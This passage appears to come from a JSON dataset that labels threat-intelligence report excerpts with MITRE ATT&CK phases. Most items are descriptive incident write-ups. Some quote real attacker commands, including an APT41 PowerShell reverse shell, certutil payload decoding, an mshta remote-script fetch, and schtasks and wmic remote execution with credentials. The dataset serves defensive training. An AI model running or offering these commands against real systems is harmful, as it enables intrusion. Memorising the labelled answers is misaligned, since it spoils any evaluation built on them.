file, on the other hand, was not a exploit at all. Rather this file was a 'honeypoc' as explained inblogby TJ Null and Andy Gill included as a link contained in the file itself. A 'honeypoc' is a file released, which purports to be a proof-of-concept exploit for a highly sough after CVE when in reality it is a ruse that includes a canary token, which allows the authors to publish research on the use of publicly available exploits and persons who execute downloaded exploits without reading the source code. Part of the ruse is making the threat actor believe the script has deleted files from the local hard drive:",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: AP created UNC2198 based on a single intrusion in June 2020 involving ICEDID, BEACON, SYSTEMBC and WINDARC. UNC2198 compromised 32 systems in 26 hours during this incident; however, ransomware was not deployed. Throughout July 2020 we attributed three intrusions to UNC2198 from Incident Response engagements, including one resulting in the deployment of MAZE ransomware. In October 2020, a slew of activity at both Incident Response engagements and Managed Defense clients resulted in the creation of two new UNC groups, and another incident attributed to UNC2198. \nOne of the new UNC groups created in October 2020 was given the designation UNC2374. UNC2374 began as its own distinct cluster where BEACON, \nWINDARC, and SYSTEMBC were observed during an incident at a Managed Defense customer. Initial similarities in tooling did not constitute a strong enough link to merge UNC2374 with UNC2198 yet. \nTwo and a half months following the creation of UNC2374, we amassed enough data points to merge UNC2374 into UNC2198. Some of the data points used in merging UNC2374 into UNC2198 include: \nUNC2198 and UNC2374 Cobalt Strike Team Servers used self-signed certificates with the following subject on TCP port 25055: \n${\\mathsf{C}}={\\mathsf{U}}{\\mathsf{S}}$ , ST $=$ CA, L $=$ California, $0=$ Oracl \nUNC2198 and UNC2374 deployed WINDARC malware to identical file paths: %APPDATA%\\teamviewers\\msi.dll   \nThe same code signing certificate used to sign an UNC2198 BEACON loader was used to sign two UNC2374 SYSTEMBC tunneler payloads. UNC2374 and UNC2198 BEACON C2 servers were accessed by the same victim system within a 10-minute time window during intrusion operations. \nThe other UNC group created in October 2020 was given the designation UNC2414. Three separate intrusions were attributed to UNC2414, and as the cluster grew, we surfaced similarities between UNC2414 and UNC2198. A subset of the data points used to merge UNC2414 into UNC2198 include: \nUNC2198 and UNC2414 BEACON servers used self-signed certificates using the following subject on TCP port 25055: \n${\\mathsf{C}}={\\mathsf{U}}{\\mathsf{S}}$ , ST $=$ CA, L $=$ California, $0=$ Oracl \nUNC2198 and UNC2414 installed BEACON as   \nC:\\Windows\\int32.dll   \nUNC2198 and UNC2414 installed the RCLONE   \nutility as C:\\Perflogs\\rclone.exe   \nUNC2198 and UNC2414 were proven to be   \nfinancially motivated actors that had leveraged   \nICEDID as initial access: UNC2198 had deployed MAZE UNC2414 had deployed EGREGOR \nThe merge between UNC2198 and UNC2414 was significant because it revealed UNC2198 has access to EGREGOR ransomware. The timing of the EGREGOR usage is also consistent with MAZE ransomware shutting down as reported by Mandiant Intelligence. Figure 3 depicts the timeline of related intrusions and merges into UNC2198. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors attempted to kill antivirus tasks that could be running on the host. The commands targeted the below processes:\nThe privilege escalation tool the threat actors brought with them was written as a text file and then decoded using certutil into a binary file.\nAs we can see from the contents of the 1.bat script, the threat actors are adding a new local administrator user and they proceed with hiding the user account by adding it to the registry using \"Special Accounts\".\nThrough the execution of the initial batch script, 1.bat, they also disabled the User Access Control(UAC) remote restriction by setting the registry key value to \"1\".\nThreat actors also enabled Wdigest.\nAfter many files were added to the system the threat actors included commands to remove them once their execution was finished.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After I reversed the malware, especially the part that handles the C2, I wanted to discover whether this campaign was still up and running. \nI set up a brand new virtual machine, downloaded Tor and started looking for an IRC client that supports SOCKS5, the proxy protocol that is needed in order to connect through Tor. IRC is a very old protocol and is less popular today than it was 20 years ago. Furthermore, IRC came out almost a decade before SOCKS5. I found HexChat, a simple, lightweight IRC client that supports both SOCKS5 and connecting to onion domains. \nWhen our Silospace sample was originally executed, its command line argument for the IRC username was php_35, so I decided to use this username when connecting to the C2 server from HexChat, thinking it would appear legitimate to the attacker. \nI connected to the server and discovered it was still working. I joined #WindowsKubernetes just like Siloscape does. There were 23 active victims there and a channel operator named admin. \nUnfortunately, after about two minutes, I was noticed and kicked out of the server. Two minutes after that, the server was no longer active  at least not at the origina onion domain I used. ",
        "output": "command and control",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it. One indicator is the 'mimikatz' string in the Netlogon event that is used by the Mimikatz Zerologon implementation.\nDuring a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this isone of the indicatorsof a Zerologon attempt.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Nodersok campaign has been pestering thousands of machines in the last several weeks, with most targets located in the United States and Europe. The majority of targets are consumers, but about $3\\%$ of encounters are observed in organizations in sectors like education, professional services, healthcare, finance, and retail. \nThe campaign is particularly interesting not only because it employs advanced fileless techniques, but also because it relies on an elusive network infrastructure that causes the attack to fly under the radar. We uncovered this campaign in midJuly, when suspicious patterns in the anomalous usage of MSHTA.exe emerged from Microsoft Defender ATP telemetry. In the days that followed, more anomalies stood out, showing up to a ten-fold increase in activity: \nAfter a process of tracking and analysis, we pieced together the infection chain: \nLike the Astaroth campaign, every step of the infection chain only runs legitimate LOLBins, either from the machine itself (mshta.exe, powershell.exe) or downloaded third-party ones (node.exe, Windivert.dll/sys). All of the relevant functionalities reside in scripts and shellcodes that are almost always coming in encrypted, are then decrypted, and run while only in memory. No malicious executable is ever written to the disk. \nThis infection chain was consistently observed in several machines attacked by the latest variant of Nodersok. Other campaigns (possibly earlier versions) with variants of this malware (whose main JavaScript payload was named 05sall.js or 04sall.js) were observed installing malicious encoded PowerShell commands in the registry that would end up decoding and running the final binary executable payload. ",
        "output": "other",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The intrusion began during January 2024, with the execution of a file named setup_wm.exe, which was downloaded from the URL hxxps://accessservicesonline.com/setup_wm.exe\nThe file setup_wm.exe was a loader designed to deploy a Cobalt Strike beacon. The domain accessservicesonline[.]com, which hosted the malicious file, has been flagged by multiple security vendors as malicious and linked to activity associated with Cobalt Strike.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Command and control (C2) connections were established via Metasploit from the breached Confluence server to the IP address 92.51.2[.]22 which is hosted in the provider called Flyservers S.A., reported in otherblogsfor being used by LockBit affiliates.\nThe connections were made to the port 4321.\nWhen downloading the Meterpreter HTA stager, the threat actor downloaded it by using a user-agent associated with Internet Explorer.\nA second C2 server 92.51.2[.]27 was employed to connect to AnyDesk.\nThrough Fofa, it was possible to identify the hostname, WIN-EKIHV2OQQP8, associated with the server in the period related to the incident.\nThis hostname was observed in the login activity on the beachhead host for this intrusion.\nThe hostname can be traced through the certificate on the RDP service (port 3389), valid since the end of October 2023.\nBy searching for this hostname infofa.info, it was possible to identify multiple IP addresses that were associated with malicious activities in VirusTotal in the past, some examples in the following image.\nThe same hunt on Censys allowed us to identify six IP addresses which were potentially associated with the ShadowSyndicate ransomware group based on a tweet made by@JRehbergCSK.\nSome of the identified IP addresses like 194.165.16[.]60 and 45.227.252[.]227 were also mentioned in aGroup-IB Reportabout ShadowSyndicate.\nThe AnyDesk connection was utilized to drop tools to enumerate the infrastructure, access credentials and exfiltrate and encrypt data.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Advanced IP Scanner was used to scan the environment.\nTask manager was opened multiple times. Possibly looking at logged in users and/or processes.\nNet Accounts was used to review user policies.\nmasscan and masscan gui were dropped but were not executed.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Around the 7.5 hour mark the threat actors began ransom deployment. Two files were dropped via RDP on each system, a PowerShell script and a PYSA ransomware executable.\nThe purpose of the PowerShell script was to disable security tools that might not have been disabled through-out the intrusion. Additionally, the script would kill many server and database processes allowing encryption of the files that might otherwise be locked by running processes.Finally, the ransomware exe was executed and the systems ransomed.Enjoy our report? Please consider donating $1 or more to the project usingPatreon. Thank you for your support! We also have pcaps, files, memory images, and Kape packages availablehere.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors attempted to dump a database usingsqlcmd.exebut the connection to the MSSQL server failed.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once opened, the LNKs will attempt to execute MSHTA.EXE to download and parse a remote XML file to execute a malicious PowerShell script: \nmshta.exe hxxp://a0704093.xsph[.]ru/bass/grudge.xml /f \nGamaredon is known to use the domain xsph[.]ru. The servers in this campaign only allow access from IP addresses inside the Ukrainian address space. \nThis PowerShell script decodes and executes a second PowerShell script (instrumentor), which collects data from the victim and reports back to a remote server. This script also allows the remote server to send a PowerShell command or binary blob containing encrypted VBScript (VBS) code to be executed locally: ",
        "output": "execution",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LSASS Dumping\nThroughout the intrusion, the threat actor accessed LSASS on multiple occasions, a pattern commonly leveraged for credential dumping and injection. As can be seen in the following capture, the threat actor's actions even resulted in LSASS crashing on one host.\nTo help facilitate credential dumping, the threat actor dropped the filem2.exe. This appeared to be a custom compiled mimikatz binary. We can confirm the file being mimikatz-related, using YARA rules published in themimikatz repository.\nThrough dynamic analysis, we can confirm them2.exebinary is essentially set up to automatically run theprivilege::debug(privilege escalation) andsekurlsa::logonpasswords(credential access) mimikatz commands on execution, rather than require user input or command line arguments.\nWhile the LSASS dumps align with the intention and abuse of additional credentials, it remains unclear how the initial local administrator account was obtained.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: BISMUTH attempted to gain initial access by sending specially crafted malicious emails from a Gmail account that appears to have been made specifically for this campaign. It's likely the group conducted reconnaissance using publicly available \nThreat actor leverages coin miner techniques to stay under the radar  here's how to spot them | Microsoft Security Blog sources and chose individual targets based on their job function. Each email was sent to only one recipient at each target organization and used tailored subject lines and lure themes, for example: \nD\u1ef1 th\u1ea3o h\u1ee3p \u0111\u1ed3ng (translates from Vietnamese to \"Draft Contract\") \u1ee8ng tuy\u1ec3n  Tr\u01b0\u1edfng ban nghi\u00ean c\u1ee9u th\u1ecb tr\u01b0\u1eddng (translates from Vietnamese to \"Application form  Head of Market Research\") \nOf note, the group sent several replies to one of these emails, which indicated that they corresponded with some targets before convincing them to open the malicious document attachment and inadvertently launch the payload. When opened, the malicious .doc file dropped several files in the hidden ProgramData folder: (1) MpSvc.dll, a malicious DLL with the same name as a legitimate Microsoft Defender Antivirus DLL, and (2) a copy of MsMpEng.exe the legitimate Microsoft Defender Antivirus executable. \nThe malicious document then added a scheduled task that launched the MsMpEng.exe copy and sideloaded the malicious MpSvc.dll. Because the latest versions of Microsoft Defender Antivirus are no longer susceptible to DLL sideloading, BISMUTH used an older copy to load the malicious DLL and establish a persistent command-and-control (C2) channel to the compromised device and consequently the network. \nUsing the newly established channel, the group dropped several files for the next stages of the attack, including a . $.7z$ archive, a copy of Word 2007, and another DLL, wwlib.dll. While it used the same name as a legitimate Microsoft Word DLL, wwlib.dll was a copy of KerrDown, a family of custom malware exclusive to BISMUTH. This file was subsequently sideloaded by the dropped copy of Word 2007-a technique used by BISMUTH extensively to load malicious code from a DLL file in the context of a legitimate process like winword.exe. \nBISMUTH established another persistence method by dropping another copy of Word 2007 in a subfolder in ProgramData. The group then created a scheduled task that launched that copy in the same malicious manner every 60 minutes  further increasing their chances of going undetected and maintaining their presence. ",
        "output": "initial access",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While Firefox was used to preview documents, it was also used to download Rclone. When the process command line is not available, defenders can look for web history artifacts. In Firefox, web history artifacts arewelldocumentedand can be directly looked at using an SQLite browser.\nRclone was dropped on the file server. This can be detected by looking at file creation, for instance using the event ID 11 from Sysmon.\nRclone was not directly started, but was launched though a VBS script named nocmd.vbs, which itself executes rcl.bat, which in turn executes Rclone.\nBefore that, the threat actor used theconfigRclone command, which performs the following action according to the documentation:\nUpon execution, network artifacts show an increase in egress traffic to the exfiltration server on port 22 (SSH). Increase of egress traffic, especially to previously unknown hosts or suspicious ports can be used to detect early exfiltration attempts. Indeed, below is presented a chart of traffic to port 22 during the whole course of this intrusion.\nExfiltration Server data:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The QBot dll was executed on the system and shortly after, injected into the msra.exe process.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Description: \nObservable : \nT1218.008 Signed Binary Proxy Execution: Rundll32   \nT1218.008 Signed Binary Proxy Execution: Odbcconf   \nRaspberry Robin uses legitimate Windows utilities like   \nfodhelper.exe and odbcconf.exe to proxy DLL file execution with   \nrundll32.exe   \n\"RUNDLL32.exe\" shell32,ShellExec_RunDLLA   \n\"C:\\WINDOWS\\syswow64\\odbcconf.exe\" -A {regsvr \"C:\\Users\\   \n[redacted]\\AppData\\Local\\Temp\\bznwi.ku.\"} -E -A {configdriver   \nVKIPDSE} -A {SETFILEDSNDIR fnpawxs PXQAND   \nofeslkscqqczuaj} -a {INSTALLDRIVER fqcmypo   \nOGEYSCKXFTBNXAF} ",
        "output": "defense evasion",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID\nDuring the execution of the initial IcedID malware, a scheduled task was created to maintain persistence.\nThe task was set to run when the user logged in using the 'LogonTrigger'. While audit logging was not enabled to observe the task creation via a 4698 event we were able to use Sysmon registry and file creation events for the task XML to correlate the creation with the initial IcedID malware.\nRegistry item related to task creation:\nFile write for task XML:\nCobalt Strike\nThe threat actor created several scheduled tasks on different servers, to achieve persistent execution of Cobalt Strike. As you can see below, the scheduled task files were created by asvchostinjected process.\nThis is an example of one of the scheduled tasks created that, when executed, downloads and executes a Cobalt Strike beacon from51.89.133[.]3.\nFurthermore, on a domain controller, the threat actor created a bat file under the local group policy directory.\nThe bat file contains the same PowerShell command as the scheduled task. These were then setup to execute at login by GPO policy targeting users in a specific domain group.\nThese same scheduled tasks could be located in the GPO policies under SYSVOL on the domain controller, below is an example of one pulled from a memory capture.\nAnydesk\nDuring the intrusion, the threat actor used a PowerShell script namedanydesk.ps1to:\nDownload AnyDesk into the ProgramData folder. \nInstall AnyDesk in silent mode and set the password to access the software remotely. \nCreate a user namedoldadministrator, add it to the local administrator group, and hide it from the Windows home/login screen.\nInstalling AnyDesk in this way sets up the program with a service to start automatically, providing the threat actor with an additional means of persistence in the network.\nThe AnyDesk ad.trace logs track incoming connections into the system. Those logs can be found under the folderC:\\Users\\<user>\\AppData\\Roaming\\AnyDesk.\nThe ad_svc.trace log files record the external IP addresses that logged into the system. Those logs can be found under the folderC:\\ProgramData\\Anydesk.\nAnyDesk Client-ID:\nThe following two IP addresses were identified that could be related to VPN services based on IPQualityScore:\n82.102.18.244  NordVPN \n194.33.40.113  Surfshark VPN\nNew User Creation\nTheanydesk.ps1script included the creation of a new user account, which was then added to the local administrators group and then hid from the logon screen. This latter technique is performed by setting the value of the following registry key related to the specific user, to \"0\":",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors used Rclone to exfiltrate sensitive data toMEGA.iocloud storage. Command line logging revealed the destination to be the Mega service and the network shares targeted.\nThis activity was also visible on the network via Zeek logs showing the SMB share connection activity.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique: Modify Registry (T1112) \nATT&CK Technique: Scheduled task/job (T1053) \nATT&CK Technique: Create or Modify System Process (T1543) \nThe attacker leverages the \"reg add\" command and other .NET plugins of the TaoWu Cobalt Strike kit to modify the registry keys and create the Windows scheduled tasks to establish persistence on the victim machine. \nThe attacker executes the \"reg add\" command to add the path of the beacon executable to the Run registry key. \nreg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v Svchost /t REG \nThe attacker runs \"sharpTask.exe\", a .NET program used to schedule a task on the Windows machine. \nsharpTask.exe --AddTask Computer|local|hostname|ip 24h:time|12:30 \\ some Servi \nThey run \"SharpHide.exe\", the utility used to create a hidden registry key. \nSharpHide.exe action=create keyvalue=\"C:\\Windows\\Temp\\123.exe\" \nThey also run \"SharpStay.exe\", a .NET tool used to create a service in the Windows machine. ",
        "output": "persistence",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Windows Command Shell  T1059.003 Command and Scripting Interpreter \nAt this stage of attack, in order to upload malicious code to target devices and execute it, the threat actors chose the following unique method: \n1. Once the payload is compiled, it is encoded in Base64.   \n2. The encoded payload is divided into chunks of 775 characters and added to a text file using the following command: Echo [Base64]{775} >> C:\\dns.txt   \n3. Once the encoded payload has been written to a file, the utility called certutil with the parameter -decode is launched. The utility converts the Base64-encoded payload into an .exe file. Certutil is a built-in tool in Windows systems.   \n4. After the file is decoded, the attackers launch certutil again, with the parameter -hashfile. This parameter is necessary to obtain the hash of the resulting file. This action has to do with the fact that the attackers conduct each iteration manually and could make a mistake at a certain point. Checking the file hash helps ensure that the data has been written correctly and that the payload has been decoded without any errors.   \n5. The file is then renamed and sent to other directories to cover any tracks, after which the attackers launch it. \nThey used Cobalt Strike Beacon as a payload. In one of the observed cases, in order to write the entire payload to a file, the threat actors needed to repeat this action 154 times. \necho   \nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   \n>> C:\\dns.txt ---- echo   \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   \nC:\\dns.txt echo   \n5kgXfx+Ig8S1vr8p7ifpkRNTIwypOpYrBDdptgjbLcJBcAUqEK/+D85bYT9RGiYYZ9UR4ejo6ca0   \nC:\\dns.txt \ncertutil -decode C:\\dns.txt C:\\dns.exe certutil -hashfile C:\\dns.exe copy C:\\dns.exeC:\\WINDOWS\\dns.exe move C:\\dns.exe C:\\windows\\mciwave.exe\nThe same method of dividing the payload was observed in the network belonging to another organization, where the threat actors divided the code into chunks of 1,024 characters. To write the payload fully, in this case they needed 128 iterations. \necho   \no3wiZy3M7pERynevamNQTtL5VZf3C+vS22sRbsUgj8Lw005hIB1mVlNyvdw5GWrKgdMrpkJ2   \n>> C:\\temp\\bug.txt echo   \nWv39JqjpZEGW7rjPYW5t09Ck9AQTc94kJ5nfTPEh6KVvRAeuMw23lQdZy/ZquMQOcy9ozRl7   \n>> C:\\temp\\bug.txt \nBelow are other identified methods of uploading and executing malicious files. These are not unique: \nCommand and Scripting Interpreter: PowerShell  T1059.001 \nAPT41 used PowerShell to obtain a reverse shell. The PowerShell code that the group used was executed in stealth mode and meant that the device it was executed on could communicate with the C&C server, which in turn allowed the threat actors to execute remote commands. \npowershell -nop -W hidden -noni -ep bypass -c \"\\$TCPClient = New-Object Net.Sockets.TCPClient('{redacted}', 80);\\$NetworkStream = \\$TCPClient.GetStream();\\$StreamWriter = New-Object \nIO.StreamWriter(\\$NetworkStream);function WriteToStream (\\$String) {[byte[]]\\$script:Buffer =   \n0..\\$TCPClient.ReceiveBufferSize | % {0};\\$StreamWriter.Write(\\$String + 'SHELL>   \n');\\$StreamWriter.Flush()}WriteToStream '';while((\\$BytesRead =   \n\\$NetworkStream.Read(\\$Buffer, 0, \\$Buffer.Length)) -gt 0) {\\$Command =   \n([text.encoding]::UTF8).GetString(\\$Buffer, 0, \\$BytesRead - 1);\\$Output = try {Invoke  \nExpression \\$Command 2>&1 | Out-String} catch {\\$_ | Out-String}WriteToStream   \n(\\$Output)}\\$StreamWriter.Close()\" \nScheduled Task/Job: Scheduled Task  T1053.005 \nTask Scheduler was used to launch malicious files on computers where the threat actors already had sessions as well as on computers that the group discovered during reconnaissance. \nSCHTASKS /Create /S 192.168.100.19 /U \"{redacted}\\administrator\" /P \"!@#Virg0#@!\" /RU SYSTEM /SC DAILY /TN Exec2022 /TR \"C:\\windows\\system32\\taskhosts.exe\" SCHTASKS /run /S 192.168.100.19 /U \"{redacted}\\administrator\" /P \"!@#Virg0#@!\" /TN Exec2022 \nSystem Services: Service Execution  T1569.002 \nWindows services were created and launched with the aim of running either an executable or a script file called install.bat. We described it in our blog post about the ColunmTK campaign. This file has been mentioned several times by other vendors (e.g., Mandiant), which is why we are not describing it in detail here. \nsc \\\\172.16.2.146 Create SuperIe binPath= \"cmd.exe /k \"c:\\users\\public\\install.bat\"; sc \\\\192.168.111.112 create res binpath=\"C:\\PerfLogs\\vmserver.exe\"; sc \\\\192.168.111.112 start res; sc query LxpSrvc; sc delete LxpSrvc; \nWindows Management Instrumentation  T1047 \nThe hackers did not overlook Windows Management Instrumentation and used the technique in several malicious campaigns. \nwmic /node:172.19.97.102 /user:{redacted}\\{redacted} /password:P\\$ssw0rd0006 process call create \"C:\\users\\Public\\COMSysUpdate.exe\" wmic /node:172.21.2.177 /user:{redacted}\\ ",
        "output": "execution",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: This time, unlike prior investigations, clear persistence was found setup on the beachhead host. Firefox.exe created these scheduled tasks as well as the run key.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Minutes after the initial compromise, a first round of discovery was observed using native Windows built-in utilities, spawning from the IcedID malware.\nLater on, the threat actor used ScreenConnect to run other discovery commands, on several occasions\nOn day two, day five, and day eight, the threat actor performed rounds of network discovery usingSoftPerfect netscan.\nEach time, the scan goes over the same IP address space, and scans for the ports 135 (RPC), 445 (SMB) and 3389 (RDP), with a few extras related to theVeeambackup solutions.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A scheduled task was created by Qbot to escalate to SYSTEM privileges. This scheduled task was created by the msra.exe process, to be run only once, a few minutes after its creation.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In one incident LAPSUS\\$ were observed to sporadically move through the victim environment via RDP in an attempt to access resources deeper in the victim environment. In some instances, victim controlled hostnames were revealed including the host \"VULTR-GUEST\" which refers to infrastructure hosted on the private cloud service, Vultr[3]. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Classic ransomware discovery stages\nA number of familiar discovery techniques were utilized using various OS commands to discover information relating to the user, host, and network configuration. Standard time discovery, domain trust discovery, workstation configuration discovery, and use of the net command to discover standard accounts and groups were observed.\nFrom the IcedID malware running via Rundll32, the following LOLBAS commands were observed:\nFrom Nigu.exe (Cobalt Strike beacon), the following LOLBAS commands were observed:\nDiscovery commands observed from other Cobalt Strike beacons using LOLBAS included:\nRSAT installation to enumerate domain computers properties\nFollowing the first discovery stage, the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host, which contains the ActiveDirectory PowerShell Module.\nOne interesting fact to notice, the threat actors had to consult the help menu of Get-ADComputer and Export-CSV using Get-Help.\nDomain computers' properties were then enumerated using the Get-ADComputer. PowerShell cmdlet and names were exported in a CSV file named ADComputers.csv.\nIn addition, threat actors searched for Active Directory related DLLs in other directories:\nHands on keyboard!\nWe observed mistakes made by the threat actors during hands-on keyboard activities, these included typos and incorrect use of commands. An example of an incorrect named command was nslook up (should have been nslookup) that also incorrectly passed the username, instead of the host name.\nAnother example, the misspelling of administrators:\nFurther examples included typos of commands:\nOther operator errors observed included the use of Cobalt Strike commands being passed as a parameter instead of a beacon task.\nThe use of DCSync is documented in a previous TheDFIRReport titled 'Cobalt Strike, a Defender's Guide\nDuring AD enumeration, the operator made use of the PowerShell Get-help cmdlet to troubleshoot the following:\nTwo file sharing web sites were used to access files, these were dropmefiles[.]com and file[.]io. Both of these services were accessed on day two from one Domain Controller on the network, with file downloads relating to tooling/scripts. On day three, a second Domain Controller was observed accessing the dropmefiles[.]com domain.\nReviewingthe WebCacheV01.dat on the domain controllers, reveals more details on the sites loaded, including the files that where downloaded from those sites:\nThe threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure at 199.127.60[.]117.\nIn addition, the threat actors also used Internet Explorer on the domain controller to search Bing.\nThis is quite unusual to search directly on the victim's browser. The current search results point to how to change the hidden view attribute in file explorer in reference to the ProgramData folder.\nShare discovery with Invoke-ShareFinder\nOther tools observed in use, included Invoke-ShareFinder, this is a common tool that we frequently encountered in cases for enumerating network shares and identifying data and potential targets. We havea detailed report covering Invoke-ShareFinder. In this case, there is a clear indication that the operator launched the Invoke-ShareFinder command via Cobalt Strike, as observed in Event ID 800:\nWindows Security Logs discovery\nOnce the threat actors had achieved privilege escalation by compromising administrator accounts, an unusual, but interesting discovery technique was observed as seen below.\nExecuting this query would return all events in the Security log that references the specified account and with a source network address. Events returned would include process creation, logins, etc.\nIts likely that this discovery technique forms an extension of T1033  System Owner/User Discovery, where the threat actor was leveraging this data source to understand the account pattern of life, any indicators from compromise, and to potentially blend in adversary activities.\nBase64 for the win\nOther discovery activities observed included a domain host discovery script via PowerShell. This was double base64 encoded.\nDecoding this revealed another PowerShell Base64 encoded string:\nThe -e is short for -EncodedCommand. The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $. Refer to the Base64 cheatsheet by Forian Rothhere.\nThere are many different variations of EncodedCommand, with shorthand and aliases available. Unit42 (PaloAlto) provides agood articleon trends and observations of PowerShell encoded commands:\nDecoding this again using CyberChef shows the resulting PowerShell script:\nMore tools dropped by threat actors\nOther binaries and scripts were dropped onto one endpoint:\nThe ns.bat file contained thousands of nslookup commands with a corresponding hostname from the network, with output appended to a ns.txt file.\nADGet\nAn Active Directory collection tool named ADGet was dropped into a user's temp folder and executed with an output filename argument. No file meta data is provided. Its a simple to use tool, the application is invoked from the command line and passes an output file name to save enumerated AD objects.\nADGet is an uncommon tool, however, its function is very similar to ADfindthe key difference is that LDAP queries are not passed, they are instead coded into the binary itself.\nThe AD objects will be enumerated generating a zip output file containing the following TSV (tab separated files) files if using a default configuration:\nThese files can be viewed with any editor or reader that supports CSV or TSV.\nAdFind\nWhile Adget was seen used, prior to that tool being run the threat actors also deployed the tried and true AdFind, which was renamed to find.exe and called using find.bat.\nAnother batch file named AD.bat was dropped into the ProgramData folder on one host and used adfind to enumerate AD objects.\nThe AD.bat file had the following commands:\nInterestingly, the first line in the batch file denotes the WMI output configuration in HTML form (from XSL file c:\\windows\\system32\\wbem\\en-US\\htable.xsl). The HTML was never used. Its likely the code was reused from other open source 